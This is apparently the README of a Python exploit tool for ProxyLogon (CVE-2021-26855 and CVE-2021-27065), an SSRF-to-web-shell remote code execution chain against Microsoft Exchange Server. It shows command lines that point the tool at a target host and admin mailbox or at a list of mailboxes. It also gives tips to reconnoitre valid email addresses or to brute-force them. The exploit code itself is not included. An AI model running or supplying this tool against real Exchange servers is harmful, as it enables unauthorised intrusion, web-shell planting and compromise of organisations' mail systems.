# ProxyLogon
ProxyLogon (CVE-2021-26855+CVE-2021-27065) Exchange Server RCE (SSRF->GetWebShell)


# ProxyLogon For Python3
```python
usage:
    python ProxyLogon.py --host=target.com --mail=admin@target.com
    python ProxyLogon.py --host=target.com --mails=./mails.txt
```

#### Tips:
* 1) recon target to find valid email address
* 2) if you do not find any email, use bruteforce target with your email file.
